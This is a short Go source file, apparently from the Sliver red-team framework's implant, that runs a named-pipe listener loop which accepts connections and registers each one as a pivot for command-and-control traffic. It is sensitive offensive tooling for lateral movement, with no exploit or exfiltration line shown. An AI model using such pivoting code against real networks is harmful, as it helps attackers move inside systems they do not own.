package namedpipe

import (
	"log"
	"math/rand"
	"os"
	"strings"
	"time"

	"github.com/bishopfox/sliver/sliver/pivots"
	"github.com/bishopfox/sliver/sliver/transports"
)

func NampedPipeAcceptNewConnection(ln *namedpipe.PipeListener, connection *transports.Connection) {
	hostname, err := os.Hostname()
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to determine hostname %s", err)
		// {{end}}
		hostname = "."
	}
	namedPipe := strings.ReplaceAll(ln.Addr().String(), ".", hostname)
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		rand.Seed(time.Now().UnixNano())
		pivotID := rand.Uint32()
		pivotsMap.AddPivot(pivotID, &conn)
		SendPivotOpen(pivotID, "named-pipe", namedPipe, connection)

		// {{if .Debug}}
		log.Println("Accepted a new connection")
		// {{end}}

		// handle connection like any other net.Conn
		go pivots.PivotConnectionHandler(&conn, connection, pivotID)
	}
}
